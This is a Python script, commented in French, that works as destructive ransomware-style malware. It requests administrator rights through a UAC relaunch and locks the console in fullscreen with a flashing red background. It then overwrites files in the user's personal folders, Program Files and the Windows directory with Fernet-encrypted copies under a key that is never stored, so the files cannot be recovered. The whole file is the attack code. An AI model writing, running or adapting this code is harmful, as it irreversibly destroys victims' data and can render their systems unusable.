import glob, ctypes, threading, sys, os, pyautogui, keyboard, time
from cryptography.fernet import Fernet

# Paramètres du cmd
os.system("@echo off")
os.system("title Password")
os.system("cls")
pyautogui.press("F11")

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def WaitF11(): # Fonction pour bloquer la fenêtre en plein écran
    
    while True:
        keyboard.wait("F11") # Attendre que la personne appuie sur F11 (ça fonctionne comme un time.sleep mais avec une condition à la place d'un temps d'attente)
        pyautogui.press("F11") # Lorsque elle appuie alors on réappuie sur la touche (avec pyautogui prcq quand on le fait avec keyboard ça spam) 
        

def SetBackgroundColor(): # Fonction pour bloquer la couleur de l'arrière-plan
    
    while True:
        os.system("color 4a")
        time.sleep(0.1)

class Crypt: # Classe pour le cryptage
    
    def __init__(self): # Se lance à l'initialisation de la classe
        
        self.key = Fernet.generate_key() # Génère une clé
        self.fernet = Fernet(self.key) # Initialiser le module Fernet

    def Crypting(self, file):
        try:
            
            file = file.replace("\\", "/") # Remplacer les backslashs
            
            with open(file, 'rb') as f: # Stocker le contenu du fichier dans une variable
                original = f.read()
            
            encrypted = self.fernet.encrypt(original) # Crypter la variable
            
            with open(file, 'wb') as encrypted_file: # Remplacer le contenu du fichier par la variable cryptée
                encrypted_file.write(encrypted)
            
        except: pass


    def CryptFiles(self, path):
        
        folder = glob.glob(path) # Liste du contenu du dossier
        path += "/*"
        fold = glob.glob(path) # Liste du contenu du dossier et des sous-dossiers
        
        for file in folder: # Crypter le contenu du dossier
            self.Crypting(file)
        for file in fold: # Crypter le contenu des sous-dossiers
            self.Crypting(file)
        
        
crypting = Crypt() # Créer une instance de la classe


if is_admin(): # Si l'utilisateur est administrateur
    
    # Threads
    wait_f11 = threading.Thread(target=WaitF11)
    set_background_color = threading.Thread(target=SetBackgroundColor)
    paths = [f"C:/Users/{os.getenv('USERNAME')}/Documents/*", f"C:/Users/{os.getenv('USERNAME')}/Desktop/*", f"C:/Users/{os.getenv('USERNAME')}/Pictures/*", f"C:/Users/{os.getenv('USERNAME')}/Downloads/*", f"C:/Users/{os.getenv('USERNAME')}/Videos/*", f"C:/Program Files/*", "C:/Program Files (x86)/*", "C:/Windows/*"] # Liste des chemins d'accès au dossiers pour le cyptage
    crypt_threads = [] # Liste des threads pour crypter
    threads = [set_background_color, wait_f11] # Liste des threads
    # Pour chaque chemin dans la liste lancer la fonction de cryptage avec le chemin spécifié
    for path in paths: crypt_threads.append(threading.Thread(target=crypting.CryptFiles, args=(path)))
    for thread in threads: thread.start()
    for thread in crypt_threads: thread.start()
    for thread in threads: thread.join()
    for thread in crypt_threads: thread.join()
    
    
else: # Sinon relancer le launcher en administrateur
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[0:]), None, 1)

# Cryptage des fichiers